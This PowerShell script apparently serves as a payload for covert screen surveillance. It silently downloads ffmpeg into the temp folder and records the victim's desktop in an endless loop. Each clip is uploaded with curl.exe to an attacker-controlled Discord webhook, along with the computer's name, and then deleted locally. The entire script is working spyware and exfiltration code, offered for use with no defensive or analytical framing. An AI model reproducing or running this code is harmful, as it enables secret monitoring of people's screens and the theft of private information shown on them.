<#==================== RECORD SCREEN TO DISCORD =========================

SYNOPSIS
This script records the screen for a specified time to a mkv file, then sends the file to a discord webhook.

#>

$hookurl = "$dc"
if ($hookurl.Ln -lt 120){$hookurl = (irm $hookurl).url}

while($true){

Function RecordScreen{
    param ([int[]]$t)
    if ($t.Length -eq 0){$t = 10}
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":hourglass: ``Downloading ffmpeg.exe. Please wait...`` :hourglass:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
        $tempDir = "$env:temp"
        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
        $response = Invoke-WebRequest -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" } -UseBasicParsing
        $release = $response.Content | ConvertFrom-Json
        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
        $zipUrl = $asset.browser_download_url
        $zipFilePath = Join-Path $tempDir $asset.name
        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
        Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        Remove-Item -Path $zipFilePath -Force
        Remove-Item -Path $extractedDir -Recurse -Force
    }
    $mkvPath = "$env:Temp\ScreenClip.mp4"
    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen (24mb Clip)`` :arrows_counterclockwise:"} | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
    .$env:Temp\ffmpeg.exe -f gdigrab -framerate 20 -t 20 -i desktop -vcodec libx264 -preset fast -crf 18 -pix_fmt yuv420p -movflags +faststart $mkvPath
    # .$env:Temp\ffmpeg.exe -f gdigrab -framerate 5 -i desktop -fs 24000000 $mkvPath
    curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
    sleep 1
    rm -Path $mkvPath -Force
}

RecordScreen

}
